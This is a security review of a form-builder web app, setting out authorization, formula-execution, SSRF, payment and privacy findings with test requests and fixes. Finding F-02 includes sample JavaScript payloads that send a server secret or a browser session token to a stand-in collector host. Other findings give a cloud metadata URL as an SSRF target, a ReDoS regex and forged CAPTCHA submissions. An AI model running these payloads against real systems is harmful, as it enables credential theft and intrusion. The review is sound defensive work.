# SifyForms Form Builder and Published Public Form
## Security, API, validation, privacy, and data-integrity review

**Review date:** 2026-08-28 (UTC)
**Repository:** `prithvikathirvel/sifyforms`
**Review scope:** React/Vite editor and published respondent experience, plus the Express/Prisma services that accept and process their data.
**Assessment status:** Pre-production security review. No source-code fixes are included in this document-only change.

> **Release decision:** Do not expose this build to hostile public traffic or use it for a consequential examination, registration, payment, or PII workload until the Critical and High findings in this document are fixed and verified with negative authorization tests. A successful frontend build is not a security sign-off.

## 1. Executive summary

SifyForms has a useful form-builder foundation, including team-aware RBAC concepts, DMS upload flows, server-side field validation, response redaction, and separate assessment/voting processors. The security boundary is not consistently enforced, however. The client currently supplies or executes too much of the control plane, while several backend routes rely on organization membership without checking the action or the form's team/share policy.

The most consequential findings are:

1. **Server-side arbitrary code execution and denial of service:** the backend evaluates builder-controlled formula text with `new Function`. The browser also evaluates custom function bodies and table formulas in the respondent/reviewer origin.
2. **Authorization bypass on form-management routes:** after `authMiddleware` and `orgMiddleware`, many editor mutations and reads have no `requirePermission` middleware and the service methods do not receive the acting user. A same-organization member can potentially read, modify, publish, move, share, or delete a form outside their team assignment.
3. **Published payload exposes assessment answers and operational secrets:** `getPublicForm` returns the complete schema and settings. This includes `correctAnswer`, `points`, payment configuration/secrets, external-validation credentials, redirect and notification settings, and other builder-only metadata when those values are persisted.
4. **Authentication, CAPTCHA, drafts, and payment are client-controlled:** OTP is a local `1234` check, the math challenge is generated and verified from client-provided text, drafts are keyed by an email/phone string with no server-issued session, and payment is initiated directly from the browser before the server verifies an amount or payment state.
5. **Public processing and DMS endpoints lack a complete proof-of-authority:** a result lookup accepts a raw submission ID; poll results do not visibly enforce public-visibility settings; and public upload confirmation is not bound to the upload initiation session.
6. **The current synchronous and unbounded data paths cannot safely absorb the requested scale:** uniqueness, vote tally, ranking, aggregate, export, JSON parsing, CSV parsing, and browser polling all have scan or memory characteristics that must be redesigned for approximately 1,000,000 registered members and up to 300,000 concurrent users/submissions.

### Severity summary

| ID | Severity | Area | Short consequence | Release gate |
| --- | --- | --- | --- | --- |
| F-01 | Critical | Backend authorization | Same-org users without a form action can read or mutate forms; sharing and processing access are also too broad. | **Block** |
| F-02 | Critical | Formula execution | A form author can execute JavaScript in the Node process and every browser that renders the form/formula. | **Block** |
| F-03 | Critical | Public schema/secret exposure | Answer keys and payment/integration data can be read from an unauthenticated public response. | **Block** |
| F-04 | Critical | OTP, CAPTCHA, and draft identity | Bot/identity gates are bypassable; draft data can be read or overwritten by knowing an identity string. | **Block** |
| F-05 | Critical | SSRF | External validation can make the server call internal addresses and forward builder-supplied credentials. | **Block** |
| F-06 | High | Payment integrity | A browser can alter amount, order details, tenant, and success state; submissions are stored before payment confirmation. | **Block for payment** |
| F-07 | High | Public results/IDOR | Scorecards and vote totals are available without a submit proof and can disclose data across forms. | **Block for assessment/voting** |
| F-08 | High | DMS/file security | Public confirm is not bound to initiation; file metadata and document references are trusted too much. | **Block for uploads** |
| F-09 | High | Response privacy | Redaction relies on form-author overrides and FULL/admin endpoints return more data than necessary. | **Block for sensitive forms** |
| F-10 | High | Async/data integrity | `setImmediate` jobs can be lost; uniqueness/voting are raceable; current form revisions can re-score old submissions. | **Block for consequential workflows** |
| F-11 | High | Resource exhaustion | 50 MB JSON, unbounded CSV rows/columns, regexes, scans, and frequent polling allow cheap DoS. | **Block at target scale** |
| F-12 | Medium | XSS/navigation/download | Remote payment HTML and stored file/data URLs cross trust boundaries; reviewer download handling is unsafe. | Fix before production |
| F-13 | Medium | Export/injection | CSV formula injection and unsafe filenames can affect reviewers or cause error-based availability issues. | Fix before export |
| F-14 | Medium | Configuration/secrets | Tracked configuration contains credentials/default secrets and conflicting PM2 environment values. | **Block production deploy** |

These ratings describe the current code paths, not a claim that exploitation has been performed against a live system. Attack examples below are safe Burp Suite-style reproductions using a test organization, test form, and synthetic values only.

## 2. Scope and review method

### Frontend

- `src/pages/FormBuilderPage.tsx`
- `src/pages/PublicFormPage.tsx`
- `src/lib/api.ts`, `src/lib/dms.ts`
- `src/lib/calculationEngine.ts`, `src/lib/ruleEngine.ts`, `src/lib/fieldValidation.ts`
- builder inspectors, settings, external validation, file/signature/table controls
- `src/components/ui/SubmissionViewer.tsx`

### Backend

- `backend/src/routes/*`
- Express controllers and middleware
- `backend/src/service/*` and `backend/src/services/*`
- `backend/src/schemas/*`, `backend/src/lib/validation.ts`, formula execution
- MySQL DAOs and `backend/prisma/schema.prisma`
- DMS, payment, processing, draft, template, AI, and export paths
- `backend/src/index.ts`, `backend/pm2.config.js`, tracked environment examples

### Method

The review traced data from browser state through request payloads, validation middleware, service authorization, DAO queries, persistence, asynchronous processing, and respondent/reviewer rendering. It also searched for dynamic execution, raw queries, URL sinks, logging of secret-bearing objects, proxy/IP handling, and unbounded loops/scans.

The frontend TypeScript/Vite build passes. Root lint is not a clean gate (the existing run reports 1,039 problems). Backend build verification is blocked in this environment because Prisma client generation cannot download its query engine. No application test suite was discovered. Therefore, every recommendation in this document needs automated regression coverage before release.

## 3. Trust boundaries and data flow

### Form editor

1. A signed-in browser loads `GET /api/forms/:formId` using a bearer token from `localStorage` and the selected `x-org-id`.
2. Redux initializes a mutable local schema/settings object.
3. `FormBuilderPage` performs browser-only checks, preserves many advanced properties, and sends the complete schema/settings in `PUT /api/forms/:formId`.
4. The server stores schema and settings as JSON text. `POST /api/forms/:formId/publish` is a separate mutation.
5. Builder-controlled URLs, credentials, formulas, file references, answer keys, and notification/payment settings then influence public rendering or server processing.

### Published respondent form

1. The browser calls `GET /api/forms/public/:orgSlug/:formSlug` with no authentication.
2. The response is used as executable form configuration: fields, rules, formulas, external validation, authentication settings, DMS settings, payment data, branding, and result-display flags.
3. The browser performs client-side validation, optional client OTP, optional client CAPTCHA, DMS uploads, external-validation calls, and direct POS calls.
4. The browser submits `POST /api/submissions` with `formId`, arbitrary `data`, and client-generated CAPTCHA fields.
5. The backend validates against the current stored schema, persists the response, and schedules assessment/voting work with `setImmediate`.
6. The browser polls public processing endpoints or fetches public vote totals.

**Security implication:** a published form is untrusted tenant content. A form editor may be an attacker, and a respondent can tamper with every browser request. The backend must treat schema/settings as a capability-limited policy, not as executable code or a source of authority.

## 4. Observed request and response payloads

The following shapes are illustrative extracts from the current browser/API flow. They are intentionally not production contracts. They show why the public response and server-side canonicalization need to be redesigned.

### Public form load

Current browser request:

```http
GET /api/forms/public/:orgSlug/:formSlug
```

No bearer token is required. The current response is effectively shaped like:

```json
{
  "id": "form_123",
  "name": "Exam registration",
  "org": { "id": "org_123", "name": "Example University", "logo": "..." },
  "schema": {
    "fields": [
      {
        "id": "score",
        "type": "number",
        "label": "Score",
        "required": false,
        "points": 1,
        "correctAnswer": 42,
        "calculation": "...",
        "externalValidation": {
          "url": "https://partner.example/check",
          "headers": [{ "key": "Authorization", "value": "Bearer ..." }]
        }
      }
    ],
    "variables": [{ "name": "total", "calculation": "...", "functionBody": "..." }]
  },
  "settings": {
    "authentication": { "enabled": true, "method": "email" },
    "captcha": { "enabled": true },
    "payment": { "tenantId": "...", "gateway": "...", "key": "..." },
    "partialSubmission": { "enabled": true }
  }
}
```

The exact fields vary by form, but the security rule is invariant: assessment answers/points, formulas/function bodies, connector credentials, merchant secrets, internal notification settings, and builder-only flags must not be in this unauthenticated response. Return a sanitized published-manifest DTO containing only the controls needed to render and submit.

### Public submission and checks

The current browser sends a client-shaped request similar to:

```json
{
  "formId": "form_123",
  "data": {
    "email_field": "candidate@example.test",
    "choice_field": "option-a",
    "document_field": {
      "documentId": "doc_123",
      "filename": "identity.pdf",
      "mimeType": "application/pdf",
      "size": 183421,
      "url": "data:application/pdf;base64,..."
    }
  },
  "captchaProblem": "7 + 5",
  "captchaAnswer": "12"
}
```

There is no immutable `revisionId`, server-issued respondent session, upload-session token, payment-order reference, or idempotency key in the basic submission contract. A hostile caller can remove or change all client fields, add arbitrary top-level data keys, replay the request, change file metadata, and submit hidden/disabled/unsupported option values. The server must derive the accepted field/value structure from the published revision.

The uniqueness request is also a public value oracle, approximately:

```json
{ "formId": "form_123", "fieldId": "email_field", "value": "candidate@example.test" }
```

External validation similarly accepts a form/field/data combination and can cause a stored connector URL to be called. Both endpoints need publication, field-policy, respondent/session, rate, and response-shaping controls.

### Drafts, uploads, and payment

The draft autosave body trusts a raw identity string:

```json
{
  "formId": "form_123",
  "identity": "candidate@example.test",
  "data": { "...": "..." },
  "stepIndex": 2
}
```

The DMS flow uses a client-visible document ID and client metadata for initiation/confirmation; the final submission can carry the document reference again. Use a server-issued, one-time upload session bound to form, field, respondent, bytes, and expiry.

Payment parameters, amount, product details, tenant/gateway identifiers, and redirect/status values are assembled or consumed in the browser. A verified server-side payment order and signed provider event must be the source of truth.

### Editor update

The editor sends a broad JSON update containing the form schema and settings, conceptually:

```json
{
  "name": "Exam registration",
  "description": "...",
  "schema": { "fields": [], "variables": [], "steps": [] },
  "settings": { "...": "..." },
  "isPublished": false
}
```

Because validation parses but discards its result, unknown keys can survive into this object and be persisted. The editor contract should use a bounded canonical schema, reject unknown keys, separate private draft data from public manifest data, and make publication a separate server-controlled revision transition.

### Public result

The current public result path is identified by a raw submission ID:

```http
GET /api/processing/submissions/:submissionId/result/public
```

The result object can contain score, field results, submitted answers, and correct answers even when the frontend elects not to render some of those properties. Replace the raw ID with an expiring token bound to form/revision/respondent and return an explicit result DTO that is shaped by server-side visibility policy.

## 5. API and authorization matrix

The table records the observed route boundary. “Org middleware” proves membership in the selected organization; it is not a substitute for form-team/action authorization.

### Form/editor routes

| Method and path | Auth boundary | Validation | Observed authorization gap | Required policy |
| --- | --- | --- | --- | --- |
| `GET /api/forms/public/:orgSlug/:formSlug` | Public | None at route | Returns complete schema/settings; no public DTO allow-list. | Return only a sanitized published revision. |
| `POST /api/forms` | Auth + org + `CREATE_FORM` | `CreateFormSchema` | Team scope is checked before body validation; schema limits are weak. | Validate bounded canonical form and target team. |
| `POST /api/forms/ai-generate` | Auth + org | Manual prompt string check only | No visible `CREATE_FORM`/quota/action check; prompt length and cost are unbounded. | Require create permission and AI quota; validate output as a safe schema. |
| `POST /api/forms/:formId/ai-edit` | Auth + org + `AIEditSchema` | Prompt/session string only | No visible `EDIT_FORM`; service receives no actor and trusts form ID/org. | Require edit permission and bind AI session to user/form. |
| `GET /api/forms` | Auth + org + `VIEW_FORM` with no team scope | None | The route's org-wide check may not match team-only roles; returned access flags are advisory. | Resolve list and actions from server-side team policy. |
| `GET /api/forms/stats` | Auth + org + `VIEW_FORM` with no team scope | None | Stats service filters some forms but performs broad org reads for members/teams. | Scope every statistic to the authorized set. |
| `POST /api/forms/parse-csv` | Auth + org | Multer memory limit 5 MB | No visible action check, MIME check, row/column/cell/parser limits, or quota. | Require edit/create action; bounded streaming parser. |
| `GET /api/forms/:formId` | Auth + org only | None | Same-org member can load a form outside their team; full builder settings are returned. | Require form `VIEW_FORM`; use a redacted editor DTO. |
| `PUT /api/forms/:formId` | Auth + org + Zod parse | `UpdateFormSchema` | No `EDIT_FORM`; service does not receive actor or call `assertFormAction`. `isPublished` is accepted in update. | Require edit action; revision/optimistic concurrency; immutable published versions. |
| `DELETE /api/forms/:formId` | Auth + org only | None | No `DELETE_FORM`. | Require delete action and confirmation/audit. |
| `POST /api/forms/:formId/publish` | Auth + org only | None | No `PUBLISH_FORM`; no server publish-readiness validation. | Require publish action and atomically publish a validated revision. |
| `POST /api/forms/:formId/duplicate` | Auth + org only | Name is not schema-validated | No visible source-view/create-target action; name can be unbounded. | Require source view plus target create action. |
| `GET /api/forms/:formId/access` | Auth + org only | None | Correctly computes useful access information, but UI flags are not enforcement. | Keep as advisory; enforce at each operation. |
| `PUT /api/forms/:formId/team` | Auth + org only | Body not schema-validated | No `MOVE_FORM` in route or service. | Require move action and validate target team/org atomically. |
| `PUT /api/forms/:formId/response-policy` | Auth + org only | Policy checked in service | No visible action check; policy lock check is raceable. | Require edit/policy action and use a transaction. |
| `GET/POST/DELETE /api/forms/:formId/shares...` | Auth + org only | Share input is a TypeScript interface, not route schema | `formShare.service` validates form/principal but does not assert `SHARE_FORM`; revoke accepts a share ID then only matches form. | Require share action for all share mutations/listing and audit actor. |

### Respondent, processing, DMS, and template routes

| Method/path | Observed issue | Security consequence |
| --- | --- | --- |
| `POST /api/submissions` | Public; client sends CAPTCHA; server ignores configured authentication and accepts arbitrary data shapes. | Direct Burp POST bypasses UI gates, hidden/disabled controls, option lists, and payment sequencing. |
| `POST /api/submissions/check-unique` | Public; does not prove the field is configured as unique or that the form is published; scans all form JSON. | Identity/value enumeration and a database scan oracle. |
| `POST /api/submissions/check-external` | Public; loads any known form ID and calls its configured URL with configured headers/auth. | SSRF, credential forwarding, PII leakage, and abuse of validation services. |
| Protected submission CRUD/export | Auth + org; service does response-level checks for many operations. | Good defense in depth exists, but DAO methods themselves are often only `id`/`formId` scoped and action checks should be centralized and transactionally enforced. |
| `GET /api/processing/submissions/:submissionId/result/public` | Public; raw ID only. | Result IDOR and disclosure of full stored result, including answers/correct answers. |
| `GET /api/processing/forms/:formId/poll-results` | Public; only checks published form in service. | Live totals can be read regardless of `showResultsPublic`/`showResultsAfterVoting`; each request scans submissions. |
| Protected processing result/leaderboard/analytics/audit routes | Auth + org only; no visible response action middleware/service assertion. | Any org member can access other teams' assessment/vote data. Result lookup is not consistently bound to `formId`. |
| `POST /api/drafts`, `GET/DELETE /api/drafts/:formId` | No auth, raw `identity` query/body key. | Read/overwrite/delete another person's draft with a guessed email/phone. |
| Public DMS initiate/confirm/download | Rate-limited, but confirm lacks initiation proof; document reference is later client-controlled. | Upload finalization/object abuse and cross-form document reference risk. |
| Auth DMS routes | Auth + org, but no visible form action check. | A member may initiate support/branding/submission uploads for forms they cannot edit. |
| Template routes | Auth + org only; no template action middleware. | Organization members can create/duplicate templates; `getTemplate` reads by ID without an org condition (static templates are intended to be shared). |
| Payment routes | Unauthenticated stubs return 410; real calls are direct browser-to-POS. | There is no trusted server-side order/payment state in this application. |

## 6. Detailed findings and safe attack examples

### F-01 — Form route authorization is incomplete (Critical)

**Evidence:** `backend/src/routes/form.routes.ts:50-68` applies auth/org middleware, but most form routes after that have no `requirePermission`. `backend/src/controllers/express/form.controller.ts` passes `formId`/`orgId` to `formService` without an actor for get/update/delete/publish/move/policy/share operations. `form.service.ts` methods such as `updateForm`, `deleteForm`, and `publishForm` load by form/org but do not call `assertFormAction`.

**Impact:** The access model contains `EDIT_FORM`, `DELETE_FORM`, `PUBLISH_FORM`, `MOVE_FORM`, and `SHARE_FORM`, but those permissions are not the actual gate for many editor operations. Cross-organization protection is present through organization membership and form/org DAO queries, so this is primarily a same-organization/team IDOR and privilege-escalation problem.

**Burp reproduction with two synthetic users:**

```http
GET /api/forms/cmk_test_form_owned_by_other_team HTTP/1.1
Host: forms.example.test
Authorization: Bearer <low-privilege-member-token>
x-org-id: org_test
```

Expected: `403` or a non-sensitive summary. Current behavior can return the full editor form when the member belongs to `org_test`, even if the form is in an unrelated team.

Then test, only in a disposable organization:

```http
PUT /api/forms/cmk_test_form_owned_by_other_team HTTP/1.1
Authorization: Bearer <same-low-privilege-token>
x-org-id: org_test
Content-Type: application/json

{"description":"authorization-test","schema":{"fields":[{"id":"f1","type":"text","label":"test","required":false}]},"settings":{}}
```

Also test `POST /publish`, `PUT /team`, `PUT /response-policy`, `POST /shares`, and `DELETE` with the low-privilege token. A client hiding buttons is not a control.

**Remediation:**

- Make the service the final policy boundary: every form operation must accept `actorId` and call `assertFormAction` after loading the form and before mutation.
- Use a single `authorizeFormAction(actor, formId, orgId, action)` helper that resolves form team, parent teams, shares, policy, and target organization.
- Require `VIEW_FORM` for builder reads, `EDIT_FORM` for update/AI/files, `PUBLISH_FORM` for publish, `DELETE_FORM` for delete, `MOVE_FORM` for team changes, `SHARE_FORM` for list/create/revoke, and explicit target-team `CREATE_FORM` for duplication.
- Bind a share lookup and delete to both `shareId` and `formId`; make all DAO mutation predicates include `orgId`/tenant context where possible.
- Add a route matrix test that runs every endpoint as owner, same-team creator, sibling-team creator, aggregate viewer, redacted viewer, outsider, revoked share, and expired share.

### F-02 — Builder formulas/custom functions execute JavaScript (Critical)

**Evidence:** `backend/src/lib/calculationEngine.ts` builds a `new Function` from the stored formula. The frontend has additional `new Function` use in `src/lib/calculationEngine.ts`, `TableConfigModal.tsx`, `TableField.tsx`, `VariableManager.tsx`, and `SubmissionViewer.tsx`. Identifier rewriting is not a sandbox.

**Server-side test payload:** in a test form's variable calculation, use an expression shaped like:

```js
(() => { fetch('https://collector.invalid/formula?x=' + encodeURIComponent(process.env.JWT_SECRET)); return 0 })()
```

If the runtime exposes the normal Node global `fetch`, this demonstrates secret exfiltration. A non-network proof is a formula that reads `globalThis.process?.env` and returns a recognizable configuration value. A resource-exhaustion proof is a bounded but expensive loop; an infinite loop can block a Node event loop and should never be tried outside an isolated test process.

**Browser-side test payload:** a custom function body or table formula can attempt:

```js
fetch('https://collector.invalid/browser', {
  method: 'POST',
  body: localStorage.getItem('token') || ''
});
return 0;
```

A malicious published form need not convince respondents to paste code: it is already the stored form configuration rendered by the origin.

**Impact:** Node process compromise/secret disclosure/DoS and browser-origin session theft, keylogging, arbitrary network requests, or crypto-mining. CSP `script-src` without `unsafe-eval` helps the browser only; it does not make backend `new Function` safe.

**Remediation:**

- Remove all dynamic JavaScript execution from persisted form content, including “function body” mode and reviewer table formulas.
- Implement a small allow-listed expression language/parser for arithmetic, comparisons, date operations, and approved aggregate functions. Parse to an AST, enforce maximum depth/node count/string length, and evaluate without property access or calls outside the allow-list.
- Do not accept `globalThis`, `process`, constructors, prototype access, computed property access, arbitrary member calls, loops, or imports.
- If business requirements truly need code, execute pre-reviewed code in a separately isolated service/container with no application credentials, no metadata route, strict CPU/memory/time limits, no network by default, and a killable worker. A `try/catch` around `new Function` is not isolation.
- Publish a Content Security Policy that omits `unsafe-eval` after the frontend no longer requires it.

### F-03 — Public form payload exposes answer keys, secrets, and builder-only settings (Critical)

**Evidence:** `form.service.ts:210-230` returns `schema: JSON.parse(form.schema)` and `settings` verbatim. `FormFieldSchema` intentionally permits `correctAnswer` and `points`; `FormSettingsSchema` does not declare every frontend property, but the validation middleware calls `schema.parse(req.body)` and discards the parsed result, so unknown properties such as `payment` can remain on `req.body` and be persisted. The public response includes all of them.

**Safe Burp check:**

```bash
curl -s 'https://forms.example.test/api/forms/public/test-org/exam-2026' \
  | jq '{answerKey: [.schema.fields[] | select(.correctAnswer != null) | {id,correctAnswer,points}], payment:.settings.payment, external:.schema.fields[]?.externalValidation}'
```

An unauthenticated user should never receive an answer key, POS secret, external API token/password, or form-owner notification address. The same rule applies to `GET /api/forms/:formId` for an editor who has only response access.

**Additional leakage:** public processing returns the complete `AssessmentResult` regardless of `showCorrectAnswers`; the frontend merely chooses whether to display `correctAnswer`. A respondent can inspect the response directly.

**Remediation:**

- Define separate DTOs: `EditorFormDTO`, `PublishedFormDTO`, `RespondentResultDTO`, `ReviewerResultDTO`. Construct them explicitly; never spread a Prisma form record or return JSON blobs wholesale.
- Keep answer keys, points, gateway credentials, external-validation secrets, notification addresses, and internal flags server-side. Store secrets in a vault/payment service and persist only an opaque provider/tenant ID.
- Strip assessment fields from the published revision and strip `correctAnswer` from public result responses unless the server has verified the configured release condition.
- Make `validate()` assign the parsed value (`req.body = schema.parse(req.body)`) or use strict schemas that reject unknown keys. Do not rely on Zod's stripping behavior if the parsed object is discarded.
- Add an automated response-contract test that fails if public JSON contains keys matching `correctAnswer`, `points`, `secret`, `password`, `token`, `salt`, `merchantKey`, `webhook`, or external auth fields.

### F-04 — OTP, CAPTCHA, and respondent authentication are not server security controls (Critical)

**Evidence:** `PublicFormPage.tsx:451-502` accepts only the hardcoded client value `1234`; no send/verify API is called. The session is stored in `sessionStorage`. The CAPTCHA is generated in the browser and sent back as `captchaProblem` plus `captchaAnswer`. `submission.service.ts:33-47` recomputes the arithmetic from the submitted problem, so a caller can choose a valid problem/answer pair. `createSubmission` never checks `settings.authentication` or a server-issued authentication session.

**Burp reproductions:**

```http
POST /api/submissions HTTP/1.1
Content-Type: application/json

{"formId":"published-test-form","data":{"email":"victim@example.test","role":"admin"},"captchaProblem":"1 + 1","captchaAnswer":"2"}
```

This request does not pass through the OTP UI. For an enabled form, use any arithmetic pair; for an authenticated form, omit any proof that an OTP was sent or verified. In the browser console of a test origin, setting `sessionStorage["form_auth_<id>"]` to a JSON object with `step:"done"` demonstrates that the UI session is self-asserted.

**Remediation:**

- Generate OTP challenges server-side with a cryptographically secure random code; store only a hash, purpose, identity hash, expiry, attempt count, and consumed timestamp. Deliver through a provider and enforce per-identity/IP/form quotas.
- Return a short-lived, signed, audience/form/identity-bound respondent session after successful verification. Keep it in a secure cookie or use a narrowly scoped one-time token; never treat `sessionStorage` as proof.
- Bind submission, draft, uniqueness, upload, and result access to that session where the form requires authentication. Normalize email/phone with an explicit locale policy.
- Replace the client math challenge with Turnstile/hCaptcha or a server-generated challenge token. Verify it server-side and consume it once. CAPTCHA is an abuse signal, not an identity proof.
- Return generic authentication/uniqueness errors to reduce account and value enumeration.

### F-05 — External validation is SSRF with credential forwarding (Critical)

**Evidence:** `ExternalValidationModal.tsx` lets a builder persist arbitrary URL, method, headers, bearer/basic/custom auth, parameters, and response path. `submission.service.ts:304-367` and `backend/src/lib/validation.ts:293-416` call the configured URL with Axios from the application network and forward configured headers. There is no visible protocol/host/IP allow-list or redirect policy.

**Attack chain:** an editor (or anyone who can exploit F-01) stores `http://169.254.169.254/latest/meta-data/` or an internal service URL in a field's external validation configuration. A public `POST /api/submissions/check-external` or a submission causes the backend to call it. A header such as `Authorization: Bearer <secret>` can be forwarded to the target. DNS rebinding can bypass a check that only validates the first DNS response.

**Remediation:**

- Prefer integrations configured by an administrator in a secret-backed connector registry; do not let arbitrary form content supply a URL or credential.
- If arbitrary partner URLs are a mandatory feature, allow only `https`, resolve and validate every address after resolution, block loopback/private/link-local/multicast/metadata ranges for IPv4 and IPv6, disable or revalidate redirects, and use a dedicated egress proxy with network policy.
- Strip hop-by-hop, cookie, proxy, and application authorization headers. Permit only named headers from an allow-list, with secrets injected by the connector.
- Bound request body, response bytes, decompression, connect/read timeouts, redirects, concurrency, and per-form calls. Apply circuit breakers and per-tenant quotas.
- Do not log URLs, headers, payloads, or response bodies when they can contain PII or secrets; log a connector ID and redacted outcome.

### F-06 — Payment amount and success are browser-controlled (High/Critical for payment)

**Evidence:** `PublicFormPage.tsx:1483-1641` computes the amount from public settings and respondent data in the browser, creates a predictable `ORD_${Date.now()}` order ID, calls `https://apidev.sifymodernization.digital/payment-service/api/pay` directly, and stores the submission before initiating payment. Razorpay key/config and tenant data come from the public form settings. `PaymentStatusPage.tsx` considers any URL without `cancelled=true` or a failure status successful; the backend payment routes are only 410 stubs.

**Burp/browser tests:** change the JSON body sent to POS from `amount: 500` to `amount: 0.01`, change `products[0].price`, replay an order ID, or navigate directly to `/payment/<formId>/status?txnId=fake`. Also submit a form with payment enabled while intercepting the POS request and canceling it; the submission has already been created.

**Remediation:**

- Create a server-side `PaymentOrder` tied to `submissionId`, immutable published revision, tenant, currency, amount, and an idempotency key. Calculate amount from server-validated fields/variables and enforce min/max/currency/rounding.
- Keep merchant secrets in the payment service/vault. Public forms may receive only a publishable key or hosted-checkout token.
- Use a signed gateway webhook or server-to-server verification as the source of truth. A browser callback/query parameter is only a hint.
- Decide and document semantics for `payment_required`: either reserve a submission and transition it to `pending_payment`, or create only after verified payment. Make retries idempotent and reconcile late webhooks.
- Replace the dev POS URL with an environment-configured production endpoint and a server-side adapter. Do not inject remote HTML into the form origin with `document.write`.
- Remove the success-by-query UI behavior; show status only after the backend verifies the order.

### F-07 — Public result and poll endpoints lack proof and form binding (High)

**Evidence:** `processing.routes.ts:14-24` exposes public result/poll routes. `getSubmissionResultPublic` looks up a result and submission by raw `submissionId`, without form, one-time token, result-visibility check, or ownership proof. `getSubmissionResult` uses `processingResultDao.findResultBySubmissionId` even after loading a caller-supplied form ID, so a result from another form can be returned if its submission ID is known. `getPollResults` checks publication but not the form's `showResultsPublic`/`showResultsAfterVoting` flags.

**Tests:**

- Submit a test assessment, capture its ID, and request the public result repeatedly from a new browser with no cookies.
- Request `/api/processing/submissions/<id-from-form-B>/result/public` after visiting form A.
- Request `/api/processing/forms/<known-form-id>/poll-results` before voting results are meant to be public.
- As a low-privilege org member, call leaderboard, analytics, and audit routes for a sibling team's form.

**Remediation:**

- Return a one-time, short-lived, signed result token in the submission response. Bind it to submission ID, form revision, respondent session, and intended audience; consume or rotate it.
- Enforce server-side result policy before loading the result. Shape scorecards according to `showScoreAfterSubmit` and `showCorrectAnswers`.
- Query results by `{submissionId, formId}` and verify the relation. Add service/DAO tests for mismatched IDs.
- Add `VIEW_AGGREGATE`, `VIEW_RESPONSES_*`, or a dedicated `VIEW_PROCESSING_RESULTS` assertion to every protected processing handler.
- Precompute vote aggregates rather than scanning every submission per public request; cache only policy-safe, intentionally public data.

### F-08 — Public DMS confirmation and file references are insufficiently bound (High)

**Evidence:** `POST /api/dms/upload/public-confirm/:documentId` invokes `confirmUpload` with only a document ID and optional metadata. It does not prove that the caller received a corresponding `public-initiate` response. The final submission accepts DMS reference objects and client-supplied `documentId`, `filename`, `mimeType`, `size`, and status; validation checks metadata but does not independently prove document ownership, form, field, upload state, or malware-scan state.

**Attack examples:**

- Replay a leaked document ID to confirm it from another client.
- Replace a submitted file reference with a known document ID from another form.
- Omit `mimeType`/`size` or lie about them in an initiation request; optional values cause several checks to be skipped.
- Upload a polyglot or executable file with an image/PDF extension and supply a permitted MIME string.

**Remediation:**

- Issue an opaque upload session at initiate, bound to form ID, field ID, respondent/session, expected size/MIME, nonce, and expiry. Require the session token for upload confirmation and final submission.
- On confirmation, query the DMS/document registry server-side and verify form/org/field ownership, exact or bounded size, checksum, storage state, and malware scan state. Never trust the reference's metadata.
- Make document IDs unguessable and do not expose broad DMS APIs. Keep public support/branding downloads separate from respondent submission documents.
- Validate actual file signatures (magic bytes), not only browser MIME/extensions; quarantine and scan documents; sanitize filenames; apply per-file, per-form, per-tenant quotas.
- Prefer direct object-storage upload with a narrowly scoped one-time URL. Keep JSON submission bodies small; do not use base64 as the production file transport.

### F-09 — Response redaction has a policy/heuristic escape hatch (High)

**Evidence:** `responseView.service.ts:51-68` treats type-based identifying detection as a default and lets `field.isIdentifying === false` suppress it. `FULL` viewers receive all parsed data and IP/user-agent. Public/admin processing results contain submitted answers. Aggregate suppression is fixed at five responses, which is not sufficient to prevent differencing in all small or correlated groups.

**Impact:** A form author can mark a name/email-like field non-identifying, a reviewer can receive full data through a result endpoint, and repeated aggregate queries can be differenced over time. Sensitive fields such as government IDs, student numbers, free text, custom “address” labels, and uploaded documents are not safely identified by a small type set.

**Remediation:**

- Make privacy classification deny-by-default for sensitive field types and allow an organization privacy officer to approve exceptions. A form author who can read responses must not be able to weaken an anonymity promise unilaterally.
- Store field sensitivity and response policy in an immutable published revision. Apply a policy ceiling in every response/result/export path.
- Return only fields needed for each view; omit IP/user-agent except in a separately authorized audit view. Avoid returning full JSON blobs to list endpoints.
- Use k-anonymity/differential-privacy or a stricter suppression policy for aggregate data, with query budgets and anti-differencing controls.
- Add download/view audit trails, retention/deletion schedules, encryption at rest/in transit, and a documented data-subject access/deletion procedure.

### F-10 — Async processing, uniqueness, voting, and revisions are not data-integrity safe (High)

**Observed issues:**

- `createSubmission` schedules assessment/vote work with `setImmediate`; a process crash, restart, or deploy can lose work and leave `processingStatus` pending.
- Unique fields are checked by loading every form submission and comparing JSON. Two concurrent requests can both pass and insert duplicate values.
- Voting duplicate prevention performs a read before the submission and later creates an audit row. The database has an index on `(formId, identifier)` but no unique constraint; concurrent votes can pass the check. The trusted identifier can be spoofed through `X-Forwarded-For`.
- Assessment scoring loads the current `submission.form.schema`; editing an answer key or points after the exam changes the meaning of old submissions. Ranking scans all results for every candidate and is not stable under concurrent processing.
- `PUT` save and `POST` publish are separate operations with no revision/ETag/transaction. Two editor tabs can overwrite one another; a publish can expose a partially validated change.
- No submission idempotency key is accepted. Browser retries/double clicks can create duplicate registrations, and payment retries can create multiple orders.

**Remediation:**

- Add an outbox/queue: transactionally write the submission and an idempotent processing job, then process with retries, dead-letter handling, and observable status. Use a unique job key per submission/type/revision.
- Normalize unique values and enforce them with a database claim table/unique index, for example `UniqueValueClaim(formId, fieldId, normalizedValue)`. Do not scan JSON for a uniqueness decision.
- Use an atomic vote claim with a unique key such as `(formId, normalizedIdentityHash)` and an immutable audit event. Decide whether IP voting is acceptable; it is weak behind NAT and privacy-sensitive.
- Add `FormRevision` and store `revisionId`/schema hash on every submission, result, payment order, and export. Published revisions must be immutable; editing creates a draft revision and publish performs an atomic pointer swap.
- Accept an `Idempotency-Key`, persist a request hash/result, and return the original response for safe retries. Enforce conflict detection with `If-Match`/revision numbers on editor writes.

### F-11 — Request and computation resource limits are insufficient (High)

**Evidence:** `backend/src/index.ts:36-37` permits 50 MB JSON and URL-encoded bodies globally. `parseCSVFromBuffer` stores every parsed row with no row/column/cell/field limit. Untrusted regex patterns are compiled during validation. Uniqueness, vote tallies, assessment rank, aggregate, and export load all matching JSON rows into memory. Public assessment polling runs every 1.5 seconds for up to 20 attempts.

**Scale/DoS examples:**

- Send a 49 MB JSON object with thousands of nested arrays to an unauthenticated endpoint, repeated across connections.
- Upload a 5 MB CSV with millions of quoted/expanded cells or a very wide header set to `/api/forms/parse-csv`.
- Configure a catastrophic-backtracking regex such as `(a+)+$` on a field and submit a long string.
- With 300,000 simultaneous scorecard viewers, the current 1.5-second polling interval can create approximately **200,000 requests/second** before considering retries or other traffic (`300,000 / 1.5`).

**Remediation:**

